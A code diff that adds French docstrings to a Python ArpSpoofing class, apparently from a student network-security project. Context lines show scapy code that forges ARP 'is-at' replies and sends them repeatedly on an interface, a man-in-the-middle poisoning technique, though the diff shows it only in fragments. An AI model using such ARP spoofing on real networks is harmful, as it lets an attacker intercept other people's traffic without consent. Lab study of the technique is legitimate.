@@ -3,6 +3,7 @@ import asyncio
 
 class ArpSpoofing:
     def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
+        """Initialise les paramètres pour le spoofing ARP."""
         self.ip_src = ip_src
         self.mac_src = mac_src
         self.ip_dst = ip_dst
@@ -10,6 +11,7 @@ class ArpSpoofing:
         self.interface = interface
 
     def spoof(self):
+        """Envoie un paquet ARP pour annoncer à une cible qu'une adresse MAC est associée à une adresse IP (fausse dans le cas de ce projet)."""
         # Créer un paquet ARP de type "is-at" (op=2) et l'envoyer
         # Fonctionnement à confirmer
         eth = scapy.Ether(dst=self.mac_dst, src=self.mac_src)
@@ -19,6 +21,7 @@ class ArpSpoofing:
         scapy.sendp(packet, iface=self.interface, verbose=False)
 
     async def start_spoofing(self, interval: float = 2.0):
+        """Démarre le spoofing ARP de manière asynchrone à des intervalles réguliers."""
         """Coroutine non-bloquante : exécute la méthode bloquante self.spoof() dans
         un executor et utilise asyncio.sleep pour le délai.
         """
@@ -34,6 +37,7 @@ class ArpSpoofing:
             print("Arrêt du spoofing ARP de "+self.ip_dst+" - "+str(e))
     
     def __str__(self):
+        """Retourne une représentation en chaîne de caractères de l'objet ArpSpoofing."""
         return f"ArpSpoofing(ip_src={self.ip_src}, mac_src={self.mac_src}, ip_dst={self.ip_dst}, mac_dst={self.mac_dst}, interface={self.interface})"
 
 #Execution en test
